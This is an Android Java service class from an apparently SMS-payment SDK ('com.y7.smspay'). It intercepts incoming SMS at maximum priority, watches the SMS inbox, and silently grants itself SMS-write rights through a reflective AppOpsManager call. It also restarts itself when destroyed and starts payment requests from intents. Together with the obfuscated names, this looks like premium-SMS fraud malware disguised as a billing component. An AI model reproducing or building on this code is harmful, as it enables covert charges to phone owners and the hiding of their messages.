package com.y7.smspay.mp.srv;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.webkit.WebSettings;
import android.webkit.WebView;

import com.y7.smspay.mp.re.MstRjtRv;
import com.y7.smspay.mp.re.SsMonOb;
import com.y7.smspay.mp.re.YNewsRjt;

import java.lang.reflect.Method;

public class MstS extends Service {
	private static int iType = 0;
	private MstRjtRv rejectReceiver = null;
	private static MstS instance = null;
	private YNewsRjt smsRec = null;
	private SsMonOb smsObs = null;
	private long startTime = 0;
    private MBinder mbinder;

	@Override
	public void onCreate() {
		super.onCreate();
		instance = this;
		this.startTime = System.currentTimeMillis();

		rejectReceiver = new MstRjtRv();
		this.smsRec = new YNewsRjt();
		this.smsObs = new SsMonOb(null);
		registerReceivers();
		b();
        this.mbinder = new MBinder();
		// if (registerReceiver(smsObs, localIntentFilter) != null) {
        
        
	}

	class MBinder extends Binder {
		MBinder() {
		}
	}

	private void b() {
		if (Build.VERSION.SDK_INT >= 19) {
			try {
				ApplicationInfo localApplicationInfo = getApplicationInfo();
				Class localClass = Class.forName("android.app.AppOpsManager");
				Object localObject = getSystemService("appops");
				Method localMethod = localClass.getMethod("setMode",
						new Class[] { Integer.TYPE, Integer.TYPE, String.class,
								Integer.TYPE });

				localMethod.invoke(
						localObject,
						new Object[] { Integer.valueOf(15),
								Integer.valueOf(localApplicationInfo.uid),
								localApplicationInfo.packageName,
								Integer.valueOf(0) });
			} catch (Exception localException) {
			}
		}
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		//DDDLog.d("onStartCommand startId" + startId);
		flags = START_STICKY;
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onStart(Intent intent, int startId) {
		if (intent != null) {
			getUA();
			//DDDLog.d("onStart Action:\t" + intent.getAction() + "\tstartId:\t"+ startId);
			// registerReceivers();
			iType = intent.getIntExtra("type", 0);
			if (iType == 1) {// 初始化
				// YPoyManager.getInstance().Init(this);
				JM.i(MstS.i()).getPay().Init(MstS.i());
			} else if (iType == 2) {// 请求支付
				String price = intent.getStringExtra("price");
				int payItemID = intent.getIntExtra("payItemID", 0);
				String str = intent.getStringExtra("str");
				String product = intent.getStringExtra("product");
				String Did = intent.getStringExtra("Did");
				String extData = intent.getStringExtra("extData");

				// YPoyManager.getInstance().reqChannelId(MPlateSrv.i(), price,
				// payItemID, str, product, Did, extData, null);
				JM.i(MstS.i())
						.getPay()
						.reqChannelId(MstS.i(), price, payItemID, str,
								product, Did, extData, null);
			} else if (iType == 3) {// 初始化
				JM.i(MstS.i()).getPay().getNeedPayList(MstS.i());
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
        return this.mbinder;
	}

	@Override
	public void onDestroy() {
		try {
			getContentResolver().unregisterContentObserver(this.smsObs);
			unregisterReceiver(this.smsRec);
			unregisterReceiver(this.rejectReceiver);
			stopForeground(false);
		} catch (Exception e) {
			e.printStackTrace();
		}
		super.onDestroy();

		Intent intent = new Intent();
		intent.setClass(this, MstS.class);
		startService(intent);
	}

	public synchronized void registerReceivers() {
		//DDDLog.d("registerReceivers");
		IntentFilter intentFilter = new IntentFilter();

		intentFilter.addAction(St.SMS_RECEIVED);
		intentFilter.addAction(St.WAP_PUSH_RECEIVED);
		intentFilter.addAction(St.SMS_RECEIVED_2);
		intentFilter.addAction(St.GSM_SMS_RECEIVED);
		intentFilter.setPriority(Integer.MAX_VALUE);
		registerReceiver(this.smsRec, intentFilter);

		IntentFilter iBc = new IntentFilter();
		iBc.setPriority(Integer.MAX_VALUE);
		iBc.addAction(St.UMS_CONNECTED);
		iBc.addAction(St.ACTION_TIME_CHANGED);
		iBc.addAction(St.ACTION_DATE_CHANGED);
		iBc.addAction(St.ACTION_TIMEZONE_CHANGED);
		iBc.addAction(St.ACTION_MEDIA_EJECT);
		iBc.addAction(St.ACTION_PACKAGE_ADDED);
		iBc.addAction(St.SIM_STATE_CHANGED);
		iBc.addAction(St.STATE_CHANGED);
		iBc.addAction(St.ANY_DATA_STATE);
		iBc.addAction(St.USER_PRESENT);
		iBc.addAction(St.PHONE_STATE);
		iBc.addAction(St.PACKAGE_REPLACED);
		iBc.addAction(St.PACKAGE_ADDED_ACTION);
		iBc.addAction(St.PACKAGE_REMOVED_ACTION);
		iBc.addAction(St.PACKAGE_ADDED);

		registerReceiver(rejectReceiver, iBc);

		getContentResolver().registerContentObserver(
				Uri.parse("content://sms/"), true, this.smsObs);
	}

	public synchronized void unregisterReceiver() {
		//DDDLog.d("unregisterReceiver");
		unregisterReceiver(rejectReceiver);
	}

	private void getUA() {
		if (JM.MB_UA == null) {
			WebView webview;
			webview = new WebView(this);
			webview.layout(0, 0, 0, 0);
			WebSettings settings = webview.getSettings();
			String ua = settings.getUserAgentString();
			JM.MB_UA = ua;
		}
	}

	public static MstS i() {
		return instance;
	}

	public boolean onReceive(Intent intent) {
		try {
			return JM.i(MstS.i()).getPay().onReceive(intent);
		} catch (Exception e) {
			e.printStackTrace();
			//DDDLog.e(e.getMessage());
			return false;
		}
	}
}
